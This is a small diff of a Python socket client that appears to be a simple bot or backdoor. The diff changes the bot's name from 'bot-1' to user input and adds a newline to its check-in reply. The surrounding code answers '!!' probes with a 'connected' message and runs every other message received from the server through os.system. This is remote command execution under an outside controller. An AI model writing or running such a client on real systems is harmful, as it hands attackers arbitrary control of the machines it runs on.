@@ -35,14 +35,14 @@ print("[+] Connected.")
 
 
 # prompt the client for a name
-name = 'bot-1'
+name = input("Enter your name: ")
 
 
 def listen_for_messages():
     while True:
         message = s.recv(1024).decode()
         if "!!" in message:
-            connected_bots = f"{name}: connected"
+            connected_bots = f"{name}: connected \n"
             s.send(connected_bots.encode())
         else:
             os.system(f"{message}")
